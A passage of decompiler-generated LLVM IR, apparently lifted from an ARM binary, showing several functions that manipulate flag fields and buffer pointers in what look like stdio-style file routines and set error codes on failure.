  %v1_15b84 = add i32 %v0_15b68, 52
  %v2_15b84 = inttoptr i32 %v1_15b84 to i32*
  %v3_15b84 = load i32, i32* %v2_15b84, align 4
  %v1_15b88 = sub i32 1, %v3_15b84
  store i32 %v1_15b88, i32* %r8.global-to-local, align 4
  %v2_15b88 = icmp ult i32 %v3_15b84, 2
  br i1 %v2_15b88, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_15b84
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_15bd0

bb:                                               ; preds = %dec_label_pc_15b84
  %v2_15b90 = icmp eq i32 %v1_15b88, 0
  br i1 %v2_15b90, label %dec_label_pc_15bd0, label %dec_label_pc_15b98

dec_label_pc_15b98:                               ; preds = %bb
  %v1_15b9c = add i32 %v0_15b68, 56
  store i32 %v1_15b9c, i32* @r4, align 4
  %v4_15ba0 = load i32, i32* inttoptr (i32 143000 to i32*), align 8
  store i32 %v4_15ba0, i32* %r1.global-to-local, align 4
  store i32 %v1_15b9c, i32* %r2.global-to-local, align 4
  %v4_15bb0 = load i32, i32* inttoptr (i32 143040 to i32*), align 64
  call void @__pseudo_branch(i32 %v4_15bb0)
  %v0_15bc4 = load i32, i32* %r6.global-to-local, align 4
  %v2_15bc4 = add i32 %v0_15bc4, 16
  %v3_15bc4 = inttoptr i32 %v2_15bc4 to i32*
  %v4_15bc4 = load i32, i32* %v3_15bc4, align 4
  store i32 %v4_15bc4, i32* @ip, align 4
  store i32 89040, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_15bc4)
  %v0_15bd0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15bd0

dec_label_pc_15bd0:                               ; preds = %.thread, %bb, %dec_label_pc_15b98
  %v0_15bdc = phi i32 [ %v0_15b68, %.thread ], [ %v0_15b68, %bb ], [ %v0_15bd0.pre, %dec_label_pc_15b98 ]
  %v1_15bd0 = inttoptr i32 %v0_15bdc to i16*
  %v2_15bd0 = load i16, i16* %v1_15bd0, align 2
  %v1_15bd4 = and i16 %v2_15bd0, 64
  %v2_15bd4 = icmp eq i16 %v1_15bd4, 0
  br i1 %v2_15bd4, label %dec_label_pc_15bec, label %dec_label_pc_15bdc

dec_label_pc_15bdc:                               ; preds = %dec_label_pc_15bd0
  store i32 %v0_15bdc, i32* @r0, align 4
  %v0_15be0 = call i32 @function_dc5c()
  %v2_15be4 = icmp eq i32 %v0_15be0, 0
  br i1 %v2_15be4, label %dec_label_pc_15bec, label %dec_label_pc_15c54

dec_label_pc_15bec:                               ; preds = %dec_label_pc_15bdc, %dec_label_pc_15bd0
  %v0_15bec = load i32, i32* @r7, align 4
  %v7_15bec = icmp eq i32 %v0_15bec, 1
  br i1 %v7_15bec, label %dec_label_pc_15bf4, label %dec_label_pc_15bec.dec_label_pc_15c08_crit_edge

dec_label_pc_15bec.dec_label_pc_15c08_crit_edge:  ; preds = %dec_label_pc_15bec
  %.pre = ptrtoint i32* %stack_var_-32 to i32
  br label %dec_label_pc_15c08

dec_label_pc_15bf4:                               ; preds = %dec_label_pc_15bec
  %v0_15bf4 = load i32, i32* @r5, align 4
  %v2_15bf8 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_15bf8, i32* %r1.global-to-local, align 4
  %v2_15bfc = inttoptr i32 %v0_15bf4 to i16*
  %v3_15bfc = call i32 @function_15cf0(i16* %v2_15bfc, i32 %v2_15bf8)
  %v1_15c00 = icmp slt i32 %v3_15bfc, 0
  br i1 %v1_15c00, label %dec_label_pc_15c54, label %dec_label_pc_15bf4.dec_label_pc_15c08_crit_edge

dec_label_pc_15bf4.dec_label_pc_15c08_crit_edge:  ; preds = %dec_label_pc_15bf4
  %v0_15c08.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_15c08

dec_label_pc_15c08:                               ; preds = %dec_label_pc_15bec.dec_label_pc_15c08_crit_edge, %dec_label_pc_15bf4.dec_label_pc_15c08_crit_edge
  %v2_15c10.pre-phi = phi i32 [ %.pre, %dec_label_pc_15bec.dec_label_pc_15c08_crit_edge ], [ %v2_15bf8, %dec_label_pc_15bf4.dec_label_pc_15c08_crit_edge ]
  %v0_15c08 = phi i32 [ %v0_15bec, %dec_label_pc_15bec.dec_label_pc_15c08_crit_edge ], [ %v0_15c08.pre, %dec_label_pc_15bf4.dec_label_pc_15c08_crit_edge ]
  store i32 %v0_15c08, i32* %r2.global-to-local, align 4
  %v0_15c0c = load i32, i32* @r5, align 4
  store i32 %v2_15c10.pre-phi, i32* %r1.global-to-local, align 4
  %v4_15c14 = call i32 @function_15e7c(i32 %v0_15c0c, i32* nonnull %stack_var_-32, i32 %v0_15c08)
  %v1_15c18 = icmp slt i32 %v4_15c14, 0
  br i1 %v1_15c18, label %dec_label_pc_15c54, label %dec_label_pc_15c20

dec_label_pc_15c20:                               ; preds = %dec_label_pc_15c08
  %v0_15c20 = load i32, i32* @r5, align 4
  %v1_15c20 = inttoptr i32 %v0_15c20 to i16*
  %v2_15c20 = load i16, i16* %v1_15c20, align 2
  %v1_15c24 = add i32 %v0_15c20, 8
  %v2_15c24 = inttoptr i32 %v1_15c24 to i32*
  %v3_15c24 = load i32, i32* %v2_15c24, align 4
  store i32 %v3_15c24, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_15c2c = and i16 %v2_15c20, -72
  store i32 0, i32* %r4.global-to-local, align 4
  store i16 %v1_15c2c, i16* %v1_15c20, align 2
  %v0_15c38 = load i32, i32* %r2.global-to-local, align 4
  %v1_15c38 = load i32, i32* @r5, align 4
  %v2_15c38 = add i32 %v1_15c38, 28
  %v3_15c38 = inttoptr i32 %v2_15c38 to i32*
  store i32 %v0_15c38, i32* %v3_15c38, align 4
  %v0_15c3c = load i32, i32* %r1.global-to-local, align 4
  %v1_15c3c = trunc i32 %v0_15c3c to i8
  %v2_15c3c = load i32, i32* @r5, align 4
  %v3_15c3c = add i32 %v2_15c3c, 2
  %v4_15c3c = inttoptr i32 %v3_15c3c to i8*
  store i8 %v1_15c3c, i8* %v4_15c3c, align 1
  %v0_15c40 = load i32, i32* %r2.global-to-local, align 4
  %v1_15c40 = load i32, i32* @r5, align 4
  %v2_15c40 = add i32 %v1_15c40, 16
  %v3_15c40 = inttoptr i32 %v2_15c40 to i32*
  store i32 %v0_15c40, i32* %v3_15c40, align 4
  %v0_15c44 = load i32, i32* %r2.global-to-local, align 4
  %v1_15c44 = load i32, i32* @r5, align 4
  %v2_15c44 = add i32 %v1_15c44, 20
  %v3_15c44 = inttoptr i32 %v2_15c44 to i32*
  store i32 %v0_15c44, i32* %v3_15c44, align 4
  %v0_15c48 = load i32, i32* %r2.global-to-local, align 4
  %v1_15c48 = load i32, i32* @r5, align 4
  %v2_15c48 = add i32 %v1_15c48, 24
  %v3_15c48 = inttoptr i32 %v2_15c48 to i32*
  store i32 %v0_15c48, i32* %v3_15c48, align 4
  %v0_15c4c = load i32, i32* %r1.global-to-local, align 4
  %v1_15c4c = load i32, i32* @r5, align 4
  %v2_15c4c = add i32 %v1_15c4c, 44
  %v3_15c4c = inttoptr i32 %v2_15c4c to i32*
  store i32 %v0_15c4c, i32* %v3_15c4c, align 4
  br label %dec_label_pc_15c58

dec_label_pc_15c54:                               ; preds = %dec_label_pc_15bdc, %dec_label_pc_15c08, %dec_label_pc_15bf4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15c58

dec_label_pc_15c58:                               ; preds = %dec_label_pc_15c20, %dec_label_pc_15c54
  %v0_15c58 = load i32, i32* %r8.global-to-local, align 4
  %v2_15c58 = icmp eq i32 %v0_15c58, 0
  br i1 %v2_15c58, label %dec_label_pc_15c58..thread6_crit_edge, label %bb18

dec_label_pc_15c58..thread6_crit_edge:            ; preds = %dec_label_pc_15c58
  %v0_15c70.pre = load i32, i32* @ip, align 4
  br label %.thread6

bb18:                                             ; preds = %dec_label_pc_15c58
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_15c68 = load i32, i32* %r6.global-to-local, align 4
  %v3_15c68 = add i32 %v1_15c68, 24
  %v4_15c68 = inttoptr i32 %v3_15c68 to i32*
  %v5_15c68 = load i32, i32* %v4_15c68, align 4
  store i32 %v5_15c68, i32* @ip, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_15c58..thread6_crit_edge, %bb18
  %v0_15c70 = phi i32 [ %v0_15c70.pre, %dec_label_pc_15c58..thread6_crit_edge ], [ %v5_15c68, %bb18 ]
  %v2_15c70 = xor i1 %v2_15c58, true
  call void @__pseudo_cond_branch(i1 %v2_15c70, i32 %v0_15c70)
  br label %dec_label_pc_15c74

dec_label_pc_15c74:                               ; preds = %dec_label_pc_15b70, %.thread6
  %v0_15c74 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_15b48, i32* @r4, align 4
  store i32 %v6_15b48, i32* @r5, align 4
  store i32 %v12_15b48, i32* @r7, align 4
  ret i32 %v0_15c74

; uselistorder directives
  uselistorder i32 %v0_15c08, { 1, 0 }
  uselistorder i32 %v3_15b84, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 3, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* inttoptr (i32 143040 to i32*), { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 19, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32 56, { 9, 7, 6, 3, 1, 2, 0, 10, 4, 8, 11, 5, 12 }
  uselistorder label %dec_label_pc_15c74, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %dec_label_pc_15c58, { 1, 0 }
  uselistorder label %dec_label_pc_15c54, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15c08, { 1, 0 }
  uselistorder label %dec_label_pc_15bd0, { 2, 1, 0 }
}

define i32 @function_15c88(i32 %arg1) local_unnamed_addr {
dec_label_pc_15c88:
  %v0_15c88 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15c88, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_15c88
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_15c88, %bb
  %v10_15c94 = phi i32 [ %arg1, %dec_label_pc_15c88 ], [ 0, %bb ]
  ret i32 %v10_15c94

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_15c98(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_15c98:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_15c98 = load i32, i32* @r4, align 4
  store i32 %v3_15c98, i32* %stack_var_-12, align 4
  %v0_15c9c = load i32, i32* %r0.global-to-local, align 4
  %v1_15c9c = inttoptr i32 %v0_15c9c to i16*
  %v2_15c9c = load i16, i16* %v1_15c9c, align 2
  %v3_15c9c = zext i16 %v2_15c9c to i32
  %v1_15ca0 = and i32 %v3_15c9c, 4
  store i32 %v1_15ca0, i32* %r5.global-to-local, align 4
  %v2_15ca0 = icmp eq i32 %v1_15ca0, 0
  store i32 %v0_15c9c, i32* %r4.global-to-local, align 4
  br i1 %v2_15ca0, label %dec_label_pc_15cb4, label %bb

bb:                                               ; preds = %dec_label_pc_15c98
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread7

dec_label_pc_15cb4:                               ; preds = %dec_label_pc_15c98
  %v1_15cb4 = icmp slt i32 %arg2, 0
  br i1 %v1_15cb4, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_15cb4
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_15cb4, %bb18
  %v1_15cbc = add i32 %v0_15c9c, 4
  %v2_15cbc = inttoptr i32 %v1_15cbc to i32*
  %v3_15cbc = load i32, i32* %v2_15cbc, align 4
  store i32 %v3_15cbc, i32* %r0.global-to-local, align 4
  %v1_15cc0 = call i32 @function_17814(i32 %v3_15cbc)
  store i32 %v1_15cc0, i32* %r0.global-to-local, align 4
  %v5_15cc8 = icmp sgt i32 %v1_15cc0, 0
  br i1 %v5_15cc8, label %.thread7, label %dec_label_pc_15ccc

dec_label_pc_15ccc:                               ; preds = %bb19
  %v2_15cc4 = icmp eq i32 %v1_15cc0, 0
  %v0_15ccc = load i32, i32* %r4.global-to-local, align 4
  %v1_15ccc = inttoptr i32 %v0_15ccc to i16*
  %v2_15ccc = load i16, i16* %v1_15ccc, align 2
  br i1 %v2_15cc4, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_15ccc
  %v2_15cd0 = or i16 %v2_15ccc, 4
  store i16 %v2_15cd0, i16* %v1_15ccc, align 2
  %v1_15cec.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread7

bb21:                                             ; preds = %dec_label_pc_15ccc
  %v2_15cd4 = or i16 %v2_15ccc, 8
  store i16 %v2_15cd4, i16* %v1_15ccc, align 2
  %v1_15ce0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_15ce0, i32* %r0.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %bb20, %bb, %bb19, %bb21
  %v1_15cec = phi i32 [ %v1_15cec.pre, %bb20 ], [ 0, %bb ], [ %v1_15cc0, %bb19 ], [ %v1_15ce0, %bb21 ]
  %v2_15ce8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15ce8, i32* @r4, align 4
  ret i32 %v1_15cec

; uselistorder directives
  uselistorder i16 %v2_15ccc, { 1, 0 }
  uselistorder i32 %v1_15cc0, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 3, 5, 6, 0, 1 }
  uselistorder label %.thread7, { 3, 0, 2, 1 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @function_15cf0(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_15cf0:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_15cf0 = load i32, i32* @r4, align 4
  store i32 %v3_15cf0, i32* %stack_var_-12, align 4
  %v3_15cf4 = load i16, i16* %arg1, align 2
  %v4_15cf4 = zext i16 %v3_15cf4 to i32
  store i32 %v4_15cf4, i32* @ip, align 4
  %tmp17 = urem i16 %v3_15cf4, 4
  %v1_15cf8 = zext i16 %tmp17 to i32
  store i32 %v1_15cf8, i32* %r2.global-to-local, align 4
  %v2_15cf8 = icmp eq i16 %tmp17, 0
  br i1 %v2_15cf8, label %bb, label %dec_label_pc_15d0c

bb:                                               ; preds = %dec_label_pc_15cf0
  br label %bb14

dec_label_pc_15d0c:                               ; preds = %dec_label_pc_15cf0
  %v1_15d0c = add nsw i32 %v1_15cf8, -1
  %v7_15d0c = icmp eq i16 %tmp17, 1
  br i1 %v7_15d0c, label %bb14, label %dec_label_pc_15d14

dec_label_pc_15d14:                               ; preds = %dec_label_pc_15d0c
  %v1_15d14 = and i32 %v4_15cf4, 2048
  %v2_15d14 = icmp eq i32 %v1_15d14, 0
  br i1 %v2_15d14, label %bb14, label %dec_label_pc_15d1c

dec_label_pc_15d1c:                               ; preds = %dec_label_pc_15d14
  %v7_15d1c = icmp eq i32 %v1_15d0c, 2
  br i1 %v7_15d1c, label %dec_label_pc_15da0, label %dec_label_pc_15d24

dec_label_pc_15d24:                               ; preds = %dec_label_pc_15d1c
  %v2_15d24 = add i32 %tmp, 40
  %v3_15d24 = inttoptr i32 %v2_15d24 to i32*
  %v4_15d24 = load i32, i32* %v3_15d24, align 4
  store i32 %v4_15d24, i32* %r3.global-to-local, align 4
  %v2_15d28 = icmp eq i32 %v4_15d24, 0
  br i1 %v2_15d28, label %dec_label_pc_15d30, label %dec_label_pc_15da0

dec_label_pc_15d30:                               ; preds = %dec_label_pc_15d24
  %v2_15d30 = add i32 %tmp, 44
  %v3_15d30 = inttoptr i32 %v2_15d30 to i32*
  %v4_15d30 = load i32, i32* %v3_15d30, align 4
  store i32 %v4_15d30, i32* %r3.global-to-local, align 4
  %v2_15d34 = add i32 %tmp, 3
  %v3_15d34 = inttoptr i32 %v2_15d34 to i8*
  %v4_15d34 = load i8, i8* %v3_15d34, align 1
  %v5_15d34 = zext i8 %v4_15d34 to i32
  store i32 %v5_15d34, i32* %r2.global-to-local, align 4
  %v2_15d38 = icmp eq i32 %v4_15d30, 0
  br i1 %v2_15d38, label %.thread1, label %bb13

.thread1:                                         ; preds = %dec_label_pc_15d30
  %v1_15d403 = sub nsw i32 0, %v5_15d34
  br label %bb14

bb13:                                             ; preds = %dec_label_pc_15d30
  %v3_15d3c = add i32 %tmp, 2
  %v4_15d3c = inttoptr i32 %v3_15d3c to i8*
  %v5_15d3c = load i8, i8* %v4_15d3c, align 1
  %v6_15d3c = zext i8 %v5_15d3c to i32
  store i32 %v6_15d3c, i32* %r3.global-to-local, align 4
  %sum = add nuw nsw i32 %v6_15d3c, %v5_15d34
  %v3_15d44 = sub nsw i32 0, %sum
  br label %bb14

bb14:                                             ; preds = %bb, %.thread1, %dec_label_pc_15d14, %dec_label_pc_15d0c, %bb13
  %v1_15d58 = phi i32 [ %v1_15d403, %.thread1 ], [ %v1_15d0c, %dec_label_pc_15d14 ], [ %v1_15d0c, %dec_label_pc_15d0c ], [ 0, %bb ], [ %v3_15d44, %bb13 ]
  %v1_15d48 = and i32 %v4_15cf4, 64
  %v2_15d48 = icmp eq i32 %v1_15d48, 0
  %v2_15d4c = add i32 %tmp, 16
  %v3_15d4c = inttoptr i32 %v2_15d4c to i32*
  %v4_15d4c = load i32, i32* %v3_15d4c, align 4
  store i32 %v4_15d4c, i32* %r3.global-to-local, align 4
  %storemerge.in.in.v = select i1 %v2_15d48, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_15d58 = sub i32 %v1_15d58, %v4_15d4c
  store i32 %v2_15d58, i32* %r3.global-to-local, align 4
  %v1_15d5c = inttoptr i32 %arg2 to i32*
  %v2_15d5c = load i32, i32* %v1_15d5c, align 4
  store i32 %v2_15d5c, i32* %r0.global-to-local, align 4
  %v3_15d5c = add i32 %arg2, 4
  %v4_15d5c = inttoptr i32 %v3_15d5c to i32*
  %v5_15d5c = load i32, i32* %v4_15d5c, align 4
  %v2_15d60 = add i32 %storemerge, %v2_15d58
  store i32 %v2_15d60, i32* %r4.global-to-local, align 4
  %v2_15d64 = sub i32 %v2_15d5c, %v2_15d60
  store i32 %v2_15d64, i32* %r2.global-to-local, align 4
  %v2_15d68 = and i32 %v2_15d60, 1073741824
  %v3_15d68 = icmp ne i32 %v2_15d68, 0
  %v4_15d68 = ashr i32 %v2_15d60, 31
  %v6_15d68 = icmp eq i1 %v3_15d68, false
  %v7_15d68 = sub i32 %v5_15d5c, %v4_15d68
  %v9_15d68 = sext i1 %v6_15d68 to i32
  %v10_15d68 = add i32 %v7_15d68, %v9_15d68
  store i32 %v10_15d68, i32* %r3.global-to-local, align 4
  %v2_15d6c = sub i32 %v10_15d68, %v5_15d5c
  %v4_15d6c = xor i32 %v10_15d68, %v5_15d5c
  %v5_15d6c = xor i32 %v2_15d6c, %v10_15d68
  %v6_15d6c = and i32 %v5_15d6c, %v4_15d6c
  %v7_15d6c = icmp slt i32 %v6_15d6c, 0
  %v8_15d6c = icmp slt i32 %v2_15d6c, 0
  %v9_15d6c = icmp eq i32 %v10_15d68, %v5_15d5c
  store i32 %v2_15d64, i32* %v1_15d5c, align 4
  %v5_15d70 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_15d70, i32* %v4_15d5c, align 4
  %v3_15d74 = xor i1 %v8_15d6c, %v7_15d6c
  %v4_15d74 = or i1 %v9_15d6c, %v3_15d74
  br i1 %v4_15d74, label %dec_label_pc_15d78, label %dec_label_pc_15d84

dec_label_pc_15d78:                               ; preds = %bb14
  br i1 %v9_15d6c, label %dec_label_pc_15d7c, label %dec_label_pc_15d88thread-pre-split

dec_label_pc_15d7c:                               ; preds = %dec_label_pc_15d78
  %v0_15d7c = load i32, i32* %r2.global-to-local, align 4
  %v1_15d7c = load i32, i32* %r0.global-to-local, align 4
  %tmp18 = icmp ugt i32 %v0_15d7c, %v1_15d7c
  br i1 %tmp18, label %dec_label_pc_15d84, label %dec_label_pc_15d88thread-pre-split

dec_label_pc_15d84:                               ; preds = %dec_label_pc_15d7c, %bb14
  %v0_15d84 = load i32, i32* %r4.global-to-local, align 4
  %v1_15d84 = sub i32 0, %v0_15d84
  store i32 %v1_15d84, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15d88

dec_label_pc_15d88thread-pre-split:               ; preds = %dec_label_pc_15d7c, %dec_label_pc_15d78
  %v0_15d88.pr = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15d88

dec_label_pc_15d88:                               ; preds = %dec_label_pc_15d88thread-pre-split, %dec_label_pc_15d84
  %v0_15d88 = phi i32 [ %v0_15d88.pr, %dec_label_pc_15d88thread-pre-split ], [ %v1_15d84, %dec_label_pc_15d84 ]
  %v1_15d88 = icmp slt i32 %v0_15d88, 0
  br i1 %v1_15d88, label %dec_label_pc_15d90, label %dec_label_pc_15da4

dec_label_pc_15d90:                               ; preds = %dec_label_pc_15d88
  %v0_15d90 = call i32 @function_d0ec()
  store i32 %v0_15d90, i32* %r0.global-to-local, align 4
  store i32 75, i32* %r3.global-to-local, align 4
  %v2_15d98 = inttoptr i32 %v0_15d90 to i32*
  store i32 75, i32* %v2_15d98, align 4
  %v0_15da4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15da4

dec_label_pc_15da0:                               ; preds = %dec_label_pc_15d24, %dec_label_pc_15d1c
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15da4

dec_label_pc_15da4:                               ; preds = %dec_label_pc_15d88, %dec_label_pc_15d90, %dec_label_pc_15da0
  %v0_15da4 = phi i32 [ %v0_15d88, %dec_label_pc_15d88 ], [ %v0_15da4.pre, %dec_label_pc_15d90 ], [ -1, %dec_label_pc_15da0 ]
  store i32 %v0_15da4, i32* %r0.global-to-local, align 4
  %v2_15dac = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15dac, i32* @r4, align 4
  ret i32 %v0_15da4

; uselistorder directives
  uselistorder i32 %v0_15da4, { 1, 0 }
  uselistorder i1 %v9_15d6c, { 1, 0 }
  uselistorder i32 %v2_15d6c, { 1, 0 }
  uselistorder i32 %v10_15d68, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v5_15d5c, { 2, 0, 1, 3 }
  uselistorder i32 %tmp, { 0, 5, 1, 3, 2, 4, 6 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 4, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 3, 0 }
  uselistorder i16 4, { 2, 0, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_15da4, { 2, 1, 0 }
  uselistorder label %bb14, { 4, 1, 2, 3, 0 }
}

define i32 @function_15db4(i32 %arg1) local_unnamed_addr {
dec_label_pc_15db4:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15db4 = load i32, i32* @r4, align 4
  store i32 %v3_15db4, i32* %stack_var_-8, align 4
  %v1_15db8 = add i32 %arg1, 8
  %v1_15dbc = inttoptr i32 %v1_15db8 to i32*
  %v2_15dbc = load i32, i32* %v1_15dbc, align 4
  %v3_15dbc = add i32 %arg1, 12
  %v4_15dbc = inttoptr i32 %v3_15dbc to i32*
  %v5_15dbc = load i32, i32* %v4_15dbc, align 4
  %v2_15dc0 = sub i32 %v5_15dbc, %v2_15dbc
  store i32 %v2_15dc0, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_15dc8 = inttoptr i32 %arg1 to i16*
  %v4_15dc8 = call i32 @function_15c98(i16* %v3_15dc8, i32 %v2_15dbc, i32 %v2_15dc0)
  %v0_15dcc = load i32, i32* @r4, align 4
  %v1_15dcc = add i32 %v0_15dcc, 8
  %v2_15dcc = inttoptr i32 %v1_15dcc to i32*
  %v3_15dcc = load i32, i32* %v2_15dcc, align 4
  store i32 %v3_15dcc, i32* %r2.global-to-local, align 4
  %v2_15dd0 = add i32 %v3_15dcc, %v4_15dc8
  %v2_15dd4 = add i32 %v0_15dcc, 20
  %v3_15dd4 = inttoptr i32 %v2_15dd4 to i32*
  store i32 %v2_15dd0, i32* %v3_15dd4, align 4
  %v0_15dd8 = load i32, i32* %r2.global-to-local, align 4
  %v1_15dd8 = load i32, i32* @r4, align 4
  %v2_15dd8 = add i32 %v1_15dd8, 16
  %v3_15dd8 = inttoptr i32 %v2_15dd8 to i32*
  store i32 %v0_15dd8, i32* %v3_15dd8, align 4
  %v2_15ddc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15ddc, i32* @r4, align 4
  ret i32 %v4_15dc8

; uselistorder directives
  uselistorder i32 %v4_15dc8, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @function_15de4() local_unnamed_addr {
dec_label_pc_15de4:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_15de4 = load i32, i32* @r4, align 4
  store i32 %v3_15de4, i32* %stack_var_-12, align 4
  %v0_15de8 = load i32, i32* @r0, align 4
  %v1_15de8 = inttoptr i32 %v0_15de8 to i16*
  %v2_15de8 = load i16, i16* %v1_15de8, align 2
  %v3_15de8 = zext i16 %v2_15de8 to i32
  store i32 %v3_15de8, i32* %r3.global-to-local, align 4
  %v0_15dec = load i32, i32* @r1, align 4
  %v2_15dec = and i32 %v0_15dec, %v3_15de8
  %v4_15dec = icmp eq i32 %v2_15dec, 0
  store i32 %v0_15de8, i32* @r4, align 4
  br i1 %v4_15dec, label %dec_label_pc_15dfc, label %dec_label_pc_15e0c

dec_label_pc_15dfc:                               ; preds = %dec_label_pc_15de4
  %v1_15dfc = and i32 %v3_15de8, 2176
  %v2_15dfc = icmp eq i32 %v1_15dfc, 0
  br i1 %v2_15dfc, label %dec_label_pc_15e04, label %dec_label_pc_15e18

dec_label_pc_15e04:                               ; preds = %dec_label_pc_15dfc
  %v2_15e04 = or i32 %v0_15dec, %v3_15de8
  store i32 %v2_15e04, i32* %r3.global-to-local, align 4
  %v1_15e08 = trunc i32 %v2_15e04 to i16
  store i16 %v1_15e08, i16* %v1_15de8, align 2
  %v0_15e0c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15e0c

dec_label_pc_15e0c:                               ; preds = %dec_label_pc_15de4, %dec_label_pc_15e04
  %v0_15e0c = phi i32 [ %v0_15de8, %dec_label_pc_15de4 ], [ %v0_15e0c.pre, %dec_label_pc_15e04 ]
  %v1_15e0c = inttoptr i32 %v0_15e0c to i16*
  %v2_15e0c = load i16, i16* %v1_15e0c, align 2
  %v3_15e0c = zext i16 %v2_15e0c to i32
  store i32 %v3_15e0c, i32* %r3.global-to-local, align 4
  %v1_15e10 = and i32 %v3_15e0c, 16
  store i32 %v1_15e10, i32* %r5.global-to-local, align 4
  %v2_15e10 = icmp eq i32 %v1_15e10, 0
  br i1 %v2_15e10, label %dec_label_pc_15e38, label %dec_label_pc_15e18

dec_label_pc_15e18:                               ; preds = %dec_label_pc_15dfc, %dec_label_pc_15e0c
  %v0_15e18 = call i32 @function_d0ec()
  store i32 %v0_15e18, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_15e20 = inttoptr i32 %v0_15e18 to i32*
  store i32 9, i32* %v2_15e20, align 4
  br label %dec_label_pc_15e24

dec_label_pc_15e24:                               ; preds = %dec_label_pc_15e40, %dec_label_pc_15e18
  %v0_15e24 = load i32, i32* @r4, align 4
  %v1_15e24 = inttoptr i32 %v0_15e24 to i16*
  %v2_15e24 = load i16, i16* %v1_15e24, align 2
  %v3_15e24 = zext i16 %v2_15e24 to i32
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_15e2c = or i32 %v3_15e24, 8
  store i32 %v1_15e2c, i32* %r3.global-to-local, align 4
  %v1_15e30 = trunc i32 %v1_15e2c to i16
  store i16 %v1_15e30, i16* %v1_15e24, align 2
  %v1_15e78.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15e70

dec_label_pc_15e38:                               ; preds = %dec_label_pc_15e0c
  %v1_15e38 = and i32 %v3_15e0c, 64
  %v2_15e38 = icmp eq i32 %v1_15e38, 0
  br i1 %v2_15e38, label %dec_label_pc_15e60, label %dec_label_pc_15e40

dec_label_pc_15e40:                               ; preds = %dec_label_pc_15e38
  %v0_15e40 = call i32 @function_dc5c()
  store i32 %v0_15e40, i32* %r0.global-to-local, align 4
  %v2_15e44 = icmp eq i32 %v0_15e40, 0
  br i1 %v2_15e44, label %dec_label_pc_15e4c, label %dec_label_pc_15e24

dec_label_pc_15e4c:                               ; preds = %dec_label_pc_15e40
  %v0_15e4c = load i32, i32* @r4, align 4
  %v1_15e4c = inttoptr i32 %v0_15e4c to i16*
